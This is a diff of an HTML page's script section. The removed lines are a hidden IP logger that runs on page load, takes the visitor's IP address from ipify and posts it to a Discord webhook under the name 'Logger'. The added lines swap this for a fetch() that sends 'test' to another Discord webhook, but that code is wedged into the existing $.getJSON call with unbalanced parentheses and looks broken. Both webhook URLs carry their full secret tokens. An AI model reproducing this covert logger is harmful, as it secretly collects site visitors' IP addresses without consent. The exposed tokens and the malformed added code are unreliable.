@@ -13,24 +13,29 @@
     <script>
       $.getJSON(
         "https://api.ipify.org?format=jsonp&callback=?",
-        function (data) {
-          var ip = data.ip;
-        //console.log(ip)
-          var request = new XMLHttpRequest(); //making a request for the webhook
-        request.open("POST", "https://discord.com/api/webhooks/1113473161938358332/prjOIP1A5nhIQ5cIAr_-sy-iWzYk0-AnuCYICR4odRYLB3JOoEQ1BFtCG_l_eXBr6GLD");
+        
 
-         request.setRequestHeader('Content-type', 'application/json');
-       
-       
-        var params = {
-        username: "Logger",
-        avatar_url: "https://static.wikia.nocookie.net/godmodes/images/9/9c/Hecker.jpg/revision/latest?cb=20221126193009",
-        content: "**IP:** *" + ip + "*"
-      }
-       request.send(JSON.stringify(params));
-          
-        }
-      );
+        fetch(
+  'https://discord.com/api/webhooks/1113441562408534060/JbnywRXcVkXo8b04JJX3xDBwOL6Atq_c0plGw-xWiHBUKD7xg-EolK5tYqEZLM1CfSae',
+  {
+    method: 'post',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      // the username to be displayed
+      username: 'webhook',
+      // the avatar to be displayed
+      avatar_url:
+        'https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png',
+      // contents of the message to be sent
+      content:
+        'test',
+
+    }),
+  }
+));
+      
     </script>
   </body>
 </html>
